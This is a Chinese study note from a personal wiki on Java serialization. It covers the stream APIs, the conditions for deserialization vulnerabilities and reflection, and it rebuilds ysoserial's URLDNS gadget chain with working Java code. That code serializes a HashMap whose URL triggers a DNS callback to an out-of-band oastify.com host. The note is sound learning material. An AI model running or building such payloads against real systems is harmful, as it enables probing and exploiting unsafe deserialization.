---
{"dg-publish":true,"permalink":"/choco-s-wiki/notes/java/"}
---

# Java序列化与反序列化学习

## 基本知识

### JDK类库中的序列化API

#### Java.io.ObjectOutputStream

`Java.io.ObjectOutputStream`代表对象输出流，它的`writeObject(Object obj)`方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。

#### Java.io.ObjectInputStream

`Java.io.ObjectInputStream`代表对象输入流，它的`readObject()`方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

#### Serializable接口

只有实现了`Serializable`和`Externalizable`接口的类的对象才能被序列化。只需要声明该接口，不需要实现。  
`Externalizable`接口继承自`Serializable`接口，实现`Externalizable`接口的类完全由自身来控制序列化的行为，而仅实现`Serializable`接口的类可以采用默认的序列化方式 。

## 原理

### demo

IDEA新建项目
![Pasted image 20231225161806.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225161806.png)
IDEA运行配置：
![Pasted image 20231225161813.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225161813.png)
选择应用程序以及执行主类（即有main函数java文件），然后添加文件如下所示：

目录结构：

├─src  
	├─main  
		├─java  
			└─org  
				└─example  
					Employee.java  
					JavaSerializ.java  
					Main.java  
					package org.example;

```java
import java.io.Externalizable;
import java.io.IOException;
import java.io.ObjectInput;
import java.io.ObjectOutput;

public class Employee implements Externalizable {
    public String name;
    public String address;

    public void mailCheck() {
        System.out.println(name + "," + address);
    }
    //重写序列化和反序列化接口
    @Override
    public void writeExternal(ObjectOutput out) throws IOException {
        System.out.println("writeExternal");
    }
    @Override
    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
        System.out.println("writeExternal");
    }
}
```



```java
package org.example;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class JavaSerializ {
    public static void main(String [] args)
    {
        Employee e = new Employee();
        e.name = "username";
        e.address = "xxxx xxxxx xxxxx";
        try
        {
            FileOutputStream fileOut = new FileOutputStream("./data.obj");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(e);
            out.close();
            fileOut.close();
            System.out.print("./data.obj");
        }catch(IOException ex)
        {
            ex.printStackTrace();
        }
    }
}
```


```java
package org.example;

import java.io.*;

public class main {
    public static void Main(String[] args) {
        try {
            FileInputStream fileIn = new FileInputStream("./data.obj");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            Employee exp = (Employee) in.readObject();
            in.close();
            System.out.println(exp.name);
            System.out.println(exp.address);
        } catch (IOException ex) {
            ex.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}
```



选择主类`JavaSerializ`编译并运行，在根目录下生成data.obj文件，为Employee类实例化对象e的序列化字节流。  
使用Java 序列化流和 Java RMI 数据包内容分析工具`SerializationDumper`查看data.obj数据的结构：  
`java -jar SerializationDumper-v1.13.jar -r data.obj`

```bash
STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
TC_OBJECT - 0x73
TC_CLASSDESC - 0x72
className
Length - 20 - 0x00 14
Value - org.example.Employee - 0x6f72672e6578616d706c652e456d706c6f796565
serialVersionUID - 0xe1 fa 76 a5 ca 8c f8 2b
newHandle 0x00 7e 00 00
classDescFlags - 0x02 - SC_SERIALIZABLE
fieldCount - 2 - 0x00 02
Fields
0:
Object - L - 0x4c
fieldName
Length - 7 - 0x00 07
Value - address - 0x61646472657373
className1
TC_STRING - 0x74
newHandle 0x00 7e 00 01
Length - 18 - 0x00 12
Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
1:
Object - L - 0x4c
fieldName
Length - 4 - 0x00 04
Value - name - 0x6e616d65
className1
TC_REFERENCE - 0x71
Handle - 8257537 - 0x00 7e 00 01
TC_STRING - 0x74
newHandle 0x00 7e 00 03
Length - 16 - 0x00 10
Value - xxxx xxxxx xxxxx - 0x78787878207878787878207878787878
```


## 反序列化漏洞的产生

1. 入口类的readObject直接调用危险方法
2. 人口类参数中包含可控类，该类有危险方法，readObject时调用
3. 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用
4. 构造函数、静态代码块等类加载时隐形执行

其他条件

1. 继承Serializable接口，可序列化
2. 入口类（source）重写readObject，参数类型宽泛，最好是jdk自带，例如hashmap、hashtable
3. 调用链（gadget chain）同名函数
4. 执行类（sink）

## Java的反射机制

先获取一个类的原型，再通过原型映射出其他东西  
反射的作用：让Java具有动态性

- 修改已有对象的属性
- 动态生成对象
- 动态调用方法
- 操作内部类和私有方法

在反序列化漏洞中的应用：

- 定制需要的对象
- 通过invoke调用除了同名函数以外的函数
- 用过Class类创建对象，引入不能序列化的类

```java
package org.example;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;


public class Main {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        Employee e = new Employee();
        Class c = e.getClass();// 反射就是操作class

        //从原型class中实例化对象
//        c.newInstance();
        Constructor employeeconstructor = c.getConstructor(String.class,int.class);
        Employee ee=(Employee) employeeconstructor.newInstance("asd",22);
        System.out.println(ee);
        //获取类中属性
        Field[] employeefields = c.getDeclaredFields();
        for(Field f:employeefields){
            System.out.println(f);
        }

        Field namefield = c.getDeclaredField("name");
        namefield.setAccessible(true); // 私有属性可访问
        namefield.set(ee,"zxc");
        System.out.println(ee);

        //调用类中方法
        Method[] employeemethods=c.getDeclaredMethods();
        for(Method m:employeemethods){
            System.out.println(m);
        }
        Method employeemethod=c.getDeclaredMethod("test1");
        employeemethod.invoke(ee);
    }
}
```



### 尝试一下URLDNS调用链

[https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)

以ysoserial的URLDNS调用链为例（Gadget Chain）：

```java
HashMap.readObject()  
HashMap.putVal()  
HashMap.hash()  
URL.hashCode()  
```
入口类是HashMap，putVal()放入一个键值对时调用URL对象的计算hash方法URL.hashCode()中发起请求。
![Pasted image 20231225161940.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225161940.png)

hashmap的put方法调用hash()方法
![Pasted image 20231225162004.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225162004.png)
hash方法会返回对象的hashcode
![Pasted image 20231225162008.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225162008.png)
若url对象的hashCode为-1时，会调用handler.hashCode()方法
![Pasted image 20231225162012.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225162012.png)
handler.hashCode()方法会在getHostAddress(u)这里产生一个dns请求
![Pasted image 20231225162018.png](/img/user/Choco%E2%80%98s%20wiki/Notes/media/Pasted%20image%2020231225162018.png)
但序列化的过程中会产生一个问题：

hashmap.put(url,1);这一步对象url的hashcode会被计算出来，不为-1，那么在其反序列化时不会调用handler.hashCode()方法，所以需要使用反射修改对象的私有属性hashCode。代码如下：

```java
public class Serialize {
    public static void serialize(Object obj) throws IOException {
        try
        {
            FileOutputStream fileOut = new FileOutputStream("./data.obj");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(obj);
            out.close();
            fileOut.close();
            System.out.print("./data.obj");
        }catch(IOException ex)
        {
            ex.printStackTrace();
        }
    }
    public static void main(String [] args) throws Exception {
        HashMap<URL,Integer> hashmap=new HashMap<URL,Integer>();
        URL url = new URL("http://p5vw6gy7y7h458eoewi909g0erkh86.oastify.com");
        // 通过反射，改变已有对象（url）的属性
        Class<? extends URL> c = url.getClass();
        // hashCode为其私有属性
        Field hashCodeField=c.getDeclaredField("hashCode");
        // 设置hashCode属性可访问
        hashCodeField.setAccessible(true);
        hashCodeField.set(url,123);
        hashmap.put(url,1);
        // 修改hashCode为-1，使其反序列化时成功调用handle.hashCode()
        hashCodeField.set(url,-1);
        serialize(hashmap);
    }
}
```



```java
public class Main {
    public static void Unseriasize() {
        try {
            FileInputStream fileIn = new FileInputStream("./data.obj");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            HashMap<URL,Integer> exp = (HashMap<URL,Integer>) in.readObject();
            in.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Unseriasize();
    }
}
```


## 最后最后

参考的东西挺杂的，这儿看一点那儿看一点，主要是根据  
和学校实训时候的视频学的，Java基础是跟着学的。  
Java真复杂，估计还得写好几篇小记。